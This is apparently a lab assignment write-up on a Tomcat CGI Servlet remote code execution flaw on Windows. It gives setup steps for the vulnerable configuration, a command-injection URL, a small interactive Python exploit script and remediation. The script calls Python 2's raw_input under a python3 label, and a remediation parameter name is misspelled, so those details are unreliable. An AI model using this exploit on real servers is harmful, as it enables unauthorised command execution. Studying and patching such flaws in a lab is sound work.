# PS
- Bug Overview: Apache Tomcat has a vulnerability in the CGI Servlet which can be exploited to achieve remote code execution (RCE). This is only exploitable when running on Windows in a non-default configuration in conjunction with batch files.
- Aim: Write a working exploit by which you can achieve RCE on the local VM.
- Install vulnerable service in a VM and ensure to meet the condition so that you can exploit it.
- Run your exploit on the vulnerable service and make a video of it.
- Write a brief report about this bug including your exploit code and link for exploit and Video proof.

# Environment Setup:
1. Install a Java Runtime Environment (JRE) in Windows.
1. Download a vulnerable version of Tomcat and extract.
1. Modify the conf\context.xml file on line 19, to enable privileged context:

``` html
<Context privileged="true">
```	
1. Modify conf\web.xml to enable the CGI Servlet by removing the comments around line 387 as follows and adding the following parameters: 

``` html

<servlet><servlet-name>cgi</servlet-name>
<servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
<init-param>
  <param-name>cgiPathPrefix</param-name>
  <param-value>WEB-INF/cgi</param-value>
</init-param>
<init-param>
  <param-name>executable</param-name>
  <param-value></param-value>
</init-param>
<init-param>
  <param-name>enableCmdLineArguments</param-name>
  <param-value>true</param-value>
</init-param>
<load-on-startup>5</load-on-startup>
</servlet>
```

1.	Enable the CGI servlet by removing comments around this – you also need to change the URL pattern to match the one in the previous step (“cgi”):
``` html
<servlet-mapping>
<servlet-name>cgi</servlet-name>
<url-pattern>/cgi/*</url-pattern>
</servlet-mapping>
```

1.	Create a folder for the CGI files:
 mkdir webapps\ROOT\WEB-INF\cgi
1.	Create any non empty bat file with valid commands.
1.	Run Tomcat via the following command:
cd bin
catalina run
1.	Trigger the following URLs and observe the dir command being run:	http://localhost:8080/cgi/test.bat?&dir
Or run the attached exploit code.
  
# Exploit Code:

```python3

import requests as re
base_url = raw_input("Enter url of the .bat cgi script: ")
while(True):
	command = raw_input("Enter the command: ")
	command = '&echo off'+'&echo.'+'&'+command
	r = re.get(base_url, params=command.replace(" ","+"))
	print(r.text)
```
  
# Remediation:
1.	Set `enableCmdLineArguements` to `False`.
1.	If above option is required then add additional parameter `cmdLineArgumentsDecoded` for proper input validation. 
